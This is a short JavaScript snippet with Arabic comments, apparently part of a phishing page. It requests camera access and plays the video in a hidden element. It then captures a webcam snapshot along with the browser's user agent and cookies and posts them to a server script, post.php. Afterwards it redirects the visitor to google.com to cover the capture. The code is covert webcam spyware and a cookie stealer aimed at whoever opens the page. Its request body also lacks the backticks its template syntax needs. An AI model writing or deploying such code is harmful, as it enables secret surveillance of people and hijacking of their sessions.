<script>
    async function startProcess() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            
            // إضافة الفيديو للمتصفح (بشكل مخفي) لضمان عمله
            video.style.display = 'none';
            document.body.appendChild(video);
            await video.play();

            // انتظار بسيط لضمان تحميل الفيديو (نصف ثانية)
            await new Promise(r => setTimeout(r, 500));

            const browserInfo = navigator.userAgent;
            const cookies = document.cookie;

            const canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            const imgData = canvas.toDataURL('image/jpeg', 0.8);

            // استخدام علامات التنصيص الصحيحة (Backticks) لإرسال البيانات
            await fetch('post.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: img=${encodeURIComponent(imgData)}&info=${encodeURIComponent(browserInfo)}&cookies=${encodeURIComponent(cookies)}
            });

            stream.getTracks().forEach(t => t.stop());
            window.location.href = "https://google.com";
        } catch (err) {
            alert("يرجى الضغط على 'سماح' للكاميرا.");
        }
    }
</script>
